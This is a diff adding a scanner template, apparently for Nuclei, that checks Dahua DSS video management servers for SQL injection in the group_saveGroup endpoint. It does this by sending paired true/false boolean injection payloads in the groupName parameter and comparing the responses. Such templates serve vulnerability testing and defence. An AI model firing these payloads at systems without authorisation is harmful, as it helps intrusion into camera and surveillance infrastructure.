@@ -1,0 +1,34 @@
+id: poc-yaml-dahua-dss-group-savegroup-sqli
+info:
+  name: Dahua DSS Video Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /emap/group_saveGroup?groupName=1%27+AND+2103%3D2104+AND+%27xvPq%27%3D%27xvPq HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":1'
+          - '"message":null'
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /emap/group_saveGroup?groupName=1%27+AND+2103%3D2103+AND+%27xvPq%27%3D%27xvPq HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":2'
+      - type: status
+        status:
+          - 200
